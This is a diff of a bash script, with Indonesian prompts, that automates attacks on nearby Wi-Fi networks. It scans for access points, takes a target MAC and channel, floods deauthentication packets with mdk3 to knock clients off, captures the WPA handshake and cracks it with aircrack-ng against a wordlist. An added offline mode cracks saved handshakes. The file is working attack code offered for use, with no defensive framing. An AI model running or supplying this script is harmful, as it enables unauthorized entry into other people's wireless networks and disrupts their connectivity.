@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 white="\033[1;37m"
 grey="\033[0;37m"
@@ -13,49 +13,69 @@ Fiuscha="\033[0;35m"
 blue="\033[1;34m"
 transparent="\e[0m"
 
-echo "    \n"
-echo $red"mengaktifkan mode monitor..."
+DUMP_PATH="/home/shun/hack/tmp/brute/hand/"
 
-echo $green
-airmon-ng start wlp9s0
+function online {
+ 
+   airmon-ng start wlp9s0
+   mkdir /tmp/hacking
 
-echo $red"mode monitor siap..."
-echo $blue"mulai scanning wifi sekitar..."
-echo $white
+   xterm -bg "#000000" -fg "#FFFFFF" -title "wifi monitor..." -e airodump-ng mon0 -w /tmp/hacking/hand
+   cat /tmp/hacking/hand-01.csv
+ 
+   printf $red"masukan mac : "
+   read mac
+   printf $yellow"masukan chanel : "
+   read chan
 
-mkdir /tmp/hacking
+   echo ""
+   printf $green"monitor chanel"
 
-xterm -bg "#000000" -fg "#FFFFFF" -title "wifi monitor..." -e airodump-ng mon0 -w /tmp/hacking/hand
-cat /tmp/hacking/hand-01.csv
-rm /tmp/hacking/*
+   xterm -bg "#000000" -fg "#00AA00" -title "chanel mon" -e airodump-ng -c $chan --bssid $mac -w /tmp/hacking/hand mon0 &
+   xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi" -e mdk3 mon0 d
 
-echo $red"masukan mac : "
-read mac
-echo $yellow"masukan chanel : "
-read chan
+   printf $yellow"lanjut ENTER "
+   read
 
-echo "\n"
-echo $green"monitor chanel"
+   xterm -bg "#000000" -fg "#00AA00" -title "serang!!!" -e aircrack-ng -w /home/shun/hack/wordlist4.txt -b $mac /tmp/hacking/hand-01.cap
 
-xterm -bg "#000000" -fg "#00AA00" -title "chanel mon" -e airodump-ng -c $chan --bssid $mac -w /tmp/hacking/hand mon0 &
-xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi" -e mdk3 mon0 d
+   printf $Cyan"simpan handsake y/ENTER : "
+   read save
 
-echo $yellow"masukan mac akhir: "
-read macser
+   if [ "$save" = "y" ]; then
 
-xterm -bg "#000000" -fg "#00AA00" -title "serang!!!" -e aircrack-ng -w /home/shun/hack/wordlist4.txt -b $macser /tmp/hacking/hand-01.cap
+      if [ ! -d $DUMP_PATH ]; then
+          mkdir -p $DUMP_PATH
+      fi
+  
+      echo ""
+      read -p "Nama handshake : " nama
 
-printf $Cyan"simpan handsake y/ENTER : "
-read save
+      if [ ! -d $DUMP_PATH"$nama" ]; then
+         mkdir $DUMP_PATH"$nama"
+      fi
+  
+      cp /tmp/hacking/* $DUMP_PATH"$nama"
+      printf $white"sukses menyimpan handsake\n\n"
+   else
+      rm /tmp/hacking/*
+      echo $red"hapus handsake"
+   fi
 
-if [ "$save" = "y" ]; then
-  mkdir /home/shun/tmp
-  #rm /tmp/hacking/save/*
-  cp /tmp/hacking/* /home/shun/tmp
-  printf $white"sukses menyimpan handsake\n\n"
+   airmon-ng stop mon0
+}
+
+function offline {
+	ls $DUMP_PATH
+	read -p "Nama handshake : " offnama
+    xterm -bg "#000000" -fg "#00AA00" -title "serang!!!" -e aircrack-ng -w /home/shun/hack/wordlist4.txt $DUMP_PATH"$offnama"/hand-01.cap &
+}
+
+clear
+
+read -p "offline/ENTER : " Main
+if [ "$Main" = "offline" ]; then
+    offline
 else
-  rm /tmp/hacking/*
-  echo $red"hapus handsake"
+    online
 fi
-
-airmon-ng stop mon0
